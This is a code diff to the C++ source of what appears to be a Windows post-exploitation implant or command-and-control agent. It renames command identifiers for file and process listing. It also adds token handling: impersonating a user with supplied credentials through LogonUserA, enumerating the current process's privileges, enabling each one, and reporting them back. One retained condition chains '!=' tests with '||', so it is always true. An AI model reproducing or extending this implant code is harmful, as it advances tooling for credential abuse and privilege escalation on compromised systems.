@@ -282,7 +282,7 @@ auto DECLFN Task::FileSystem(
     Self->Pkg->Byte( Package, SbCommandID );
     
     switch ( SbCommandID ) {
-        case Enm::Fs::List: {
+        case Enm::Fs::ListFl: {
             WIN32_FIND_DATAA FindData     = { 0 };
             SYSTEMTIME       CreationTime = { 0 };
             SYSTEMTIME       AccessTime   = { 0 };
@@ -408,7 +408,7 @@ auto DECLFN Task::FileSystem(
 
 _KH_END:
     if ( !Success ) { return KhGetError; }
-    if ( SbCommandID != Enm::Fs::List || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
+    if ( SbCommandID != Enm::Fs::ListFl || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
         Self->Pkg->Int32( Package, Success );
     }
 
@@ -1232,6 +1232,8 @@ auto DECLFN Task::Token(
             CHAR*  Password    = Self->Psr->Str( Parser, 0 );
             HANDLE TokenHandle = nullptr;
 
+            BOOL Success = FALSE;
+
             Self->Advapi32.LogonUserA( 
                 UserName, DomainName, Password, LOGON_NETCREDENTIALS_ONLY, LOGON32_PROVIDER_DEFAULT, &TokenHandle
             );
@@ -1239,9 +1241,39 @@ auto DECLFN Task::Token(
                 break;
             }
 
-            Self->Tkn->Add( TokenHandle, Self->Session.ProcessID );
+            if ( Self->Tkn->Add( TokenHandle, Self->Session.ProcessID ) ) {
+                Success = TRUE;
+            }
+
+            Self->Pkg->Int32( Package, Success );
+
+            break;
         }
         case Enm::Token::GetPriv: {
+            HANDLE TokenHandle = Self->Tkn->CurrentPs();
+            Self->Pkg->Int32( Package, Self->Tkn->GetPrivs( TokenHandle ) );
+            Self->Ntdll.NtClose( TokenHandle );
+
+            break;
+        }
+        case Enm::Token::ListPriv: {
+            ULONG PrivListLen  = 0;
+            PVOID PrivList     = nullptr;
+            HANDLE TokenHandle = Self->Tkn->CurrentPs();
+
+            PrivList = Self->Tkn->ListPrivs( TokenHandle, PrivListLen );
+
+            for ( INT i = 0; i < PrivListLen; i++ ) {
+                Self->Tkn->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+                Self->Pkg->Str( Package, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+                Self->Pkg->Int32( Package, static_cast<PRIV_LIST**>(PrivList)[i]->Attributes );
+                Self->Hp->Free( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+            }
+
+            Self->Ntdll.NtClose( TokenHandle );
+            Self->Hp->Free( PrivList );
+
+            break;
         }
     }
 
@@ -1283,7 +1315,7 @@ auto DECLFN Task::Process(
             
             break;
         }
-        case Enm::Ps::List: {
+        case Enm::Ps::ListPs: {
             PVOID ValToFree = NULL;
             ULONG ReturnLen = 0;
             ULONG Status    = STATUS_SUCCESS;
@@ -1400,7 +1432,7 @@ auto DECLFN Task::Exit(
 ) -> ERROR_CODE {
     INT8 ExitType = Self->Psr->Byte( Job->Psr );
 
-    if ( ExitType == Enm::Exit::Process ) {
+    if ( ExitType == Enm::Exit::Proc ) {
         Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
     } else if ( ExitType == Enm::Exit::Thread ) {
         Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
